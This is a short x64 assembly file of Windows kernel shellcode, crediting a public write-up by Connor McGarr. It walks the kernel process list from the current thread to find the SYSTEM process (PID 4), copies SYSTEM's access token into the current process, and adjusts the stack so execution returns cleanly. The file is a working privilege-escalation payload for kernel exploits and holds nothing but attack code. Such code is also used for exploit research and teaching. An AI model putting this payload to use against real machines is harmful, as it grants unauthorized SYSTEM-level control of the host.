[BITS 64]

; This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
; https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

  mov rax, [gs:0x188]
  mov rax, [rax + 0x70]
  mov rbx, rax

find_system_pid:
  mov rbx, [rbx + 0x188]
  sub rbx, 0x188
  mov rcx, [rbx + 0x180]
  cmp rcx, 4
  jnz find_system_pid

  mov rcx, [rbx + 0x208]

  and cl, 0xF0

  mov [rax + 0x208], rcx
  
recovery:

  add rsp, 0x38

  ret